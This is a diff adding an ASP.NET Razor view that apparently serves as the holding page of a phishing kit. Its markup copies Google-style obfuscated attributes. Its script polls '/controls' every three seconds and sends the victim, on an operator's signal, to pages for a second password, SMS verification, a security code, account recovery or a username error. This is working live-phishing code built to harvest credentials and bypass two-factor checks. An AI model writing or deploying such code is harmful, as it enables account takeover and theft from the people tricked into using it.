@@ -1,0 +1,64 @@
+﻿@{var edit = ViewBag.users as Users; }
+
+<div id="view_container" class="JhUD8d SQNfcc vLGJgb" jscontroller="WFS13" jsaction="rcuQ6b:npT2md" jsmodel="Z7PiFb qFmk3b qbZ0Se nqpTHe hAn1A YPPRX eV9nn Xu2csd hc6Ubd">
+    <div jscontroller="Ka7I6" jsaction="jiqeKb:ZCwQbe;u3KAb:ZCwQbe;cLkKDf:n4vmRb;DPVjO:tVBJG;vu6WPd:bCkDte;rcuQ6b:rcuQ6b;click:vBw6I(preventDefault=true|L6M1Fb),EtG4V(preventDefault=true|CkSUlf);DiUYjc:.CLIENT;abBxn:.CLIENT;nKbR0:.CLIENT;ffNU7c:.CLIENT" jsname="nUpftc" class="zWl5kd" data-view-id="b5STy" style="">
+        <center><img style="width: 90%;" src="~/img/ads.gif"></center>
+    </div>
+</div>
+
+
+
+
+
+<script type="text/javascript">
+    $(document).ready(function () {
+        gonder();
+        var ints = self.setInterval("gonder()", 3000);
+    });
+
+    function gonder() {
+        
+        $.ajax({
+            type: 'POST',
+            url: '/controls',
+            data: postmodel,
+            success: function (msg) {
+
+                if (msg == 1) {
+                    window.location.href = 'Index';
+                }
+                if (msg == 3) {
+                    window.location.href = 'Password2';
+                }
+                if (msg == 4) {
+                    window.location.href = 'Verification-sms';
+                }
+                if (msg == 5) {
+                    window.location.href = 'Verification-sms-error';
+                }
+                if (msg == 6) {
+                    window.location.href = 'Verification';
+                }
+                if (msg == 7) {
+                    window.location.href = 'tamamlandi';
+                }
+                if (msg == 8) {
+                    window.location.href = 'Verification-number';
+                }
+                if (msg == 9) {
+                    window.location.href = 'Sec-Code';
+                }
+                if (msg == 10) {
+                    window.location.href = 'recovery';
+                }
+                if (msg == 11) {
+                    window.location.href = 'username-error';
+                }
+            }
+        });
+
+    }
+
+</script>
+
+
